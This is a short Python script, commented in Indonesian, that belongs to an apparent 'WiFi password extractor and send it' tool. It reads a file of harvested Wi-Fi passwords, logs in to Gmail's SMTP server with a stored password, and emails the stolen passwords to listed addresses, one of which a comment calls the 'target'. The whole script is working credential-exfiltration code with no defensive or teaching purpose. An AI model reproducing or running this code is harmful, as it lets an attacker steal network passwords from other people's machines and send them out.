import smtplib , ssl
import os
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
#Note : 
# Matikan akses aplikasi kurang aman pada Gmail & Dan Enable Imap Yang ada pada settings akun gmail anda

email = "dummyvariablesget@gmail.com"
mail = MIMEMultipart("alternative")
mail["From"] = "Coach"
mail["Subject"] = "Lost Gan"

with open(os.getcwd() + "/WifiPasswordExtractorAndSendIT/message.txt",'r') as fuf:
    message = fuf.read()
with open(os.getcwd() + "/WifiPasswordExtractorAndSendIT/result.txt",'r') as fuf:
    message = message +"\nPassword Wifi Yang didapat:" + fuf.read()


mail.attach(MIMEText(message,"plain"))

with smtplib.SMTP("smtp.gmail.com",port= 587) as set_server:
    set_server.ehlo()
    set_server.starttls()
    set_server.ehlo()

    with open(os.getcwd() + "/WifiPasswordExtractorAndSendIT/passwordemail.txt",'r') as fuf:
        password = fuf.read()

    set_server.login(user=email, password=password)
    listemail = ["dirahedas@gmail.com",email] # masukin Email yang ditarget wkwkw
    for the_email in listemail:
        set_server.sendmail(email,the_email,mail.as_string())

print("Yow udah ke Send Coba Cek !")